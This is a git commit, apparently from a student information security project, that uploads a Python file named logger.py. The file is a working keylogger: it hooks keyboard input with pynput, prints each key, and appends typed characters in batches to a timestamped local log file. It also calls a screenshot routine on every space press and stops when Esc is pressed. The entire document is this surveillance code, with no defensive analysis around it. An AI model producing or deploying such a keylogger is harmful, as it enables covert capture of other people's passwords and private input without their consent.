bb547c2bc860a35a1953ebf9755cf36e7a7a3af6
AshankaW <86885038+AshankaW@users.noreply.github.com>
2022-10-16 12:05:08 +0530

    Add files via upload

---
+++ logger.py
@@ -0,0 +1,46 @@
+import random
+import time
+import pynput
+from Screenshot import *
+import multiprocessing
+
+
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+file_name = time.strftime("%Y%m%d-%H%M%S")+".txt"
+
+
+def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def write_file(keys):
+    with open(f"C:\\1)SLIIT\\3rd Year\\2nd Semester\\Information Security Project\\Tests\\Test 2\\Key Logs\\{file_name}", "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write('\n')
+                take_screenshots()
+            elif k.find("Key") == -1:
+                f.write(k)
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
